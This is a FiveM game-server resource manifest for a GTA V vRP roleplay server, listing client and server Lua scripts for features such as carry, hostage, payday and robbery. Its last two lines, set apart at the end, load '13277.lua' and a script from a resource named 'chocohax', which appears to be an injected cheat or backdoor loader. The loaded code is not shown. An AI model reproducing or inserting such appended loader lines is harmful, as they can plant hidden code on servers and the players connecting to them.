fx_version "adamant"
game "gta5"


client_scripts {
    "lib/Tunnel.lua",
    "lib/Proxy.lua",
    "menu-c.lua",
    "tinta-c.lua",
    "rent-c.lua",
    "hospital_cl.lua",
    "cl_carry.lua",
    "cl_takehostage.lua",
    "payday-c.lua",
    "cl_npc.lua",
    "aresteaza-c.lua",
    "cl_carcontrol",
    "client_rob",
    "va_client",
    "hitman-c.lua",
    'safezones.lua',
    "discord-c.lua",
    "cleanup-c.lua",
    "client.lua",
    "btz-c.lua",
    "cl_me.lua",
    "carwash-c.lua",
    "vehfail-c.lua"
  }
  files {
    "img/carIcon.png"
}
server_scripts {
    "@vrp/lib/utils.lua",
    "menu-s.lua",
    "tinta-s.lua",
    "hospital_sv.lua",
    "ticket-s.lua",
    "btz-s.lua",
    "va_server",
    "rent-s.lua",
    "server_rob",
    "payday-s.lua",
    "gps-s.lua",
    "sv_me.lua",
    "hitman-s.lua",
    "aresteaza-s.lua",
    "discord-s.lua",
    "carwash-s.lua",
    "vehfail-s.lua",
    "sv_takehostage.lua",
    "sv_carry.lua",
    "staff.lua"
  }
  


client_script "13277.lua"
client_script '@chocohax/10992.lua'